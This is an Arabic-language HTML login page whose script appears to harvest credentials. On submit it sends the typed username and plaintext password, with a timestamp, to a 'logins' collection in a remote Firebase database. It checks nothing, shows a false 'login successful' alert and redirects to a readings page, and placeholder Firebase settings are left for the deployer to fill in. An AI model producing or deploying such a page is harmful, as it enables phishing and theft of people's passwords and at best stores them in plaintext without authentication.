<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body { font-family: "Tahoma", sans-serif; background-color: #f5f5f5; direction: rtl; text-align: center; padding: 50px; }
    .login-box { background: white; padding: 30px; border-radius: 8px; width: 300px; margin: auto; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
    input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; text-align: center; }
    button { background-color: #2e8b57; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>تسجيل الدخول</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="اسم المستخدم (أرقام فقط)" required>
      <input type="password" id="password" placeholder="كلمة السر" required>
      <button type="submit">دخول</button>
    </form>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js";

    // استبدل هذه البيانات ببيانات مشروعك الخاصة من Firebase
    const firebaseConfig = {
      apiKey: "YOUR_API_KEY",
      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
      databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com",
      projectId: "YOUR_PROJECT_ID",
      storageBucket: "YOUR_PROJECT_ID.appspot.com",
      messagingSenderId: "YOUR_ID",
      appId: "YOUR_APP_ID"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    document.getElementById("loginForm").onsubmit = function(e) {
      e.preventDefault();
      const user = document.getElementById("username").value;
      const pass = document.getElementById("password").value;

      // حفظ بيانات الدخول
      push(ref(db, 'logins'), {
        username: user,
        password: pass,
        time: new Date().toLocaleString()
      }).then(() => {
        alert("تم تسجيل الدخول بنجاح!");
        window.location.href = "ar.html"; // الانتقال لصفحة القراءات
      });
    };
  </script>
</body>
</html>
